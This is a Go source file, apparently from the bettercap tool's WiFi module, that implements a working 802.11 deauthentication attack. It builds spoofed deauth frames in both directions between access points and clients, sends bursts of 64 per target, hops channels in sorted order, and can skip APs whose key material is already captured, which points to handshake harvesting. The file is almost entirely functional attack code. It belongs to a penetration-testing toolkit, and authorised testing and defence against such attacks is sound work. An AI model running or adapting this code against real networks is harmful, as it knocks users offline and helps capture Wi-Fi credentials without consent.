package wifi

import (
	"fmt"
	"net"
	"sort"

	"github.com/bettercap/bettercap/v2/packets"
)

func (mod *WiFiModule) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
	for seq := uint16(0); seq < 64 && mod.Running(); seq++ {
		if err, pkt := packets.NewDot11Deauth(ap, client, ap, seq); err != nil {
			mod.Error("could not create deauth packet: %s", err)
			continue
		} else {
			mod.injectPacket(pkt)
		}

		if err, pkt := packets.NewDot11Deauth(client, ap, ap, seq); err != nil {
			mod.Error("could not create deauth packet: %s", err)
			continue
		} else {
			mod.injectPacket(pkt)
		}
	}
}

func (mod *WiFiModule) skipDeauth(to net.HardwareAddr) bool {
	return hardwareAddrIn(mod.deauthSkip, to)
}

func (mod *WiFiModule) isDeauthSilent() bool {
	if err, is := mod.BoolParam("wifi.deauth.silent"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.deauthSilent = is
	}
	return mod.deauthSilent
}

func (mod *WiFiModule) doDeauthOpen() bool {
	if err, is := mod.BoolParam("wifi.deauth.open"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.deauthOpen = is
	}
	return mod.deauthOpen
}

func (mod *WiFiModule) doDeauthAcquired() bool {
	if err, is := mod.BoolParam("wifi.deauth.acquired"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.deauthAcquired = is
	}
	return mod.deauthAcquired
}

func (mod *WiFiModule) deauthFlowsFor(selector wifiSelector) []wifiTarget {
	toDeauth := make([]wifiTarget, 0)
	for _, target := range mod.resolveWiFiTargets(selector, true) {
		if !mod.skipDeauth(target.apSnapshot.HW) && !mod.skipDeauth(target.clientSnapshot.HW) {
			toDeauth = append(toDeauth, target)
		} else {
			mod.Debug("skipping ap:%v client:%v because skip list %v", target.ap, target.client, mod.deauthSkip)
		}
	}
	return toDeauth
}

func (mod *WiFiModule) deauthCompleter(prefix string) []string {
	return mod.wifiTargetCompleter(prefix, true)
}

func (mod *WiFiModule) startDeauth(target string) error {
	selector, err := newWiFiSelector(target)
	if err != nil {
		return err
	}

	// parse skip list
	if deauthSkip, err := mod.parseWiFiSkipList("wifi.deauth.skip"); err != nil {
		return err
	} else {
		mod.deauthSkip = deauthSkip
	}

	// if not already running, temporarily enable the pcap handle
	// for packet injection
	if !mod.Running() {
		if err := mod.Configure(); err != nil {
			return err
		}
		defer mod.handle.Close()
	}

	toDeauth := mod.deauthFlowsFor(selector)

	if len(toDeauth) == 0 {
		if selector.all {
			return nil
		}
		return fmt.Errorf("%q is an unknown BSSID, client or ESSID, is in the deauth skip list, or doesn't have detected clients", selector.raw)
	}

	mod.writes.Add(1)
	go func() {
		defer mod.writes.Done()

		// since we need to change the wifi adapter channel for each
		// deauth packet, let's sort by channel so we do the minimum
		// amount of hops possible
		sort.Slice(toDeauth, func(i, j int) bool {
			return toDeauth[i].apSnapshot.Channel < toDeauth[j].apSnapshot.Channel
		})

		// send the deauth frames
		for _, deauth := range toDeauth {
			client := deauth.client
			ap := deauth.ap
			apSnapshot := deauth.apSnapshot
			clientSnapshot := deauth.clientSnapshot
			if mod.Running() {
				logger := mod.Info
				if mod.isDeauthSilent() {
					logger = mod.Debug
				}

				if (apSnapshot.Encryption == "" || apSnapshot.Encryption == "OPEN") && !mod.doDeauthOpen() {
					mod.Debug("skipping deauth for open network %s (wifi.deauth.open is false)", apSnapshot.Hostname)
				} else if ap.HasKeyMaterial() && !mod.doDeauthAcquired() {
					mod.Debug("skipping deauth for AP %s (key material already acquired)", apSnapshot.Hostname)
				} else {
					logger("deauthing client %s from AP %s (channel:%d encryption:%s)", client.String(), apSnapshot.Hostname, apSnapshot.Channel, apSnapshot.Encryption)

					mod.onChannel(apSnapshot.Channel, func() {
						mod.sendDeauthPacket(apSnapshot.HW, clientSnapshot.HW)
					})
				}
			}
		}
	}()

	return nil
}
